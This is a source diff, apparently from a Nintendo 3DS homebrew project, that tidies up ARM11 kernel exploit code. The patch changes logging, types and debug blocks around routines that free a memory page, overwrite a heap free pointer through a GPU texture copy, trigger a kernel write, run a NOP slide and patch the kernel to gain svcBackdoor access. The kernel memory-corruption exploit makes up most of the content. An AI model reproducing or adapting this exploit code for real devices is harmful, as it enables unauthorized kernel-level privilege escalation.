@@ -34,9 +34,9 @@ int do_gshax_copy(void *dst, void *src, unsigned int len)
 	// Sometimes I don't know the actual value to check (when copying from unknown memory)
 	// so instead of using check_mem/check_off, just loop "enough" times.
 	for (i = 0; i < 5; ++i) {
-		GSPGPU_FlushDataCache (NULL, src, len);
+		GSPGPU_FlushDataCache(NULL, src, len);
 		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
-		GSPGPU_FlushDataCache (NULL, check_mem, 16);
+		GSPGPU_FlushDataCache(NULL, check_mem, 16);
 		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
 	}
 
@@ -127,20 +127,15 @@ int get_version_specific_addresses()
 
 int arm11_kernel_exploit_setup(void)
 {
-	unsigned int *test;
-	int *ipc_buf;
-	int model;
-
 	get_version_specific_addresses();
 
-	// part 1: corrupt kernel memory
-	u32 tmp_addr;
-
-	unsigned int mem_hax_mem;
-	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
-	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;
+	// Part 1: corrupt kernel memory
+	u32 mem_hax_mem;
+	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
+	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;
 
 	printf("Freeing memory\n");
+    u32 tmp_addr;
 	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 
 
 	printf("Backing up heap area\n");
@@ -156,16 +151,11 @@ int arm11_kernel_exploit_setup(void)
 
 	// Overwrite free pointer
 	dbg_log("Overwriting free pointer 0x%08X\n", mem_hax_mem);
-
-	//Trigger write to kernel
 	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
-	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
 
-#ifdef DEBUG_PROCESS
-	printf("Triggered kernel write\n");
-	gfxFlushBuffers();
-	gfxSwapBuffers();
-#endif
+    // Trigger write to kernel
+	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
+	dbg_log("Triggered kernel write\n");
 
 	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
 	printf("Restoring heap\n");
@@ -177,14 +167,7 @@ int arm11_kernel_exploit_setup(void)
 	HB_FlushInvalidateCache();
 
 	((void (*)(void))nop_slide)();
-
-#ifdef DEBUG_PROCESS
-	printf("Exited nop slide\n");
-	gfxFlushBuffers();
-	gfxSwapBuffers();
-#endif
-
-	get_version_specific_addresses();
+	dbg_log("Executed nop slide\n");
 
 	return 1;
 }
@@ -228,7 +211,7 @@ arm11_patch_kernel(void)
 				  "ldr pc, [sp], #4 \t\n");
 }
 
-int doARM11Hax()
+bool doARM11Hax()
 {
 	int result = 0;
 	int i;
@@ -237,21 +220,14 @@ int doARM11Hax()
 	build_nop_slide(nop_slide, 0x1000);
 	HB_FlushInvalidateCache();
 
-	dbg_log("Testing nop slide\n");
 	((void (*)(void))nop_slide)();
-	dbg_log("Exited nop slide\n");
+	dbg_log("Executed test nop slide\n");
 
-
-	unsigned int addr;
-	void *this = 0x08F10000;
-	int *written = 0x08F01000;
 	arm11_buffer = linearMemAlign(0x10000, 0x10000);
 
 	// wipe memory for debugging purposes
 	for (i = 0; i < 0x1000/4; i++)
-	{
 		arm11_buffer[i] = 0xdeadbeef;
-	}
 
 	if (arm11_kernel_exploit_setup())
 	{
@@ -264,14 +240,10 @@ int doARM11Hax()
 		{
 			dbg_log("Testing SVC 0x7B\n");
 			svcBackdoor(test);
+            return true;
 		}
 	}
-#ifdef DEBUG_PROCESS
-	else
-	{
-		printf("Kernel exploit set up failed!\n");
-	}
-#endif
 
-	return 0;
+    dbg_log("Kernel exploit set up failed!\n\n");
+	return false;
 }
